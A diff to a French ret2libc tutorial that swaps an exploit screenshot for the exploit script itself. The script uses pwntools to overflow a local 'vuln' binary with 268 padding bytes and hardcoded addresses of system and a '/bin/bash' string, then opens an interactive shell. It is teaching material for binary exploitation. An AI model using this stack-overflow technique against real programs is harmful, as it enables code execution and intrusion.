@@ -134,7 +134,20 @@ On a donc récupéré les adresses de system et de "/bin/sh" pour faire exécute
 
 Maintenant qu'on a tout ce qu'il nous faut, on écrit notre exploit :
 
-<img class="img_full" src="/hacking/pwn_2of4_ret2libc/exploit.png" alt="exploit" >
+```python
+#!/usr/bin/en python2
+
+from pwn import *
+
+offset = 268
+payload = "A" * offset
+payload += p32(0xf7dfa7d0) # @system
+payload += p32(0x42424242) # @retour - foo
+payload += p32(0xf7f3688a) # @"/bin/bash\x00"
+
+r = process(["./vuln", payload])
+r.interactive()
+```
 
 Remarque :
 
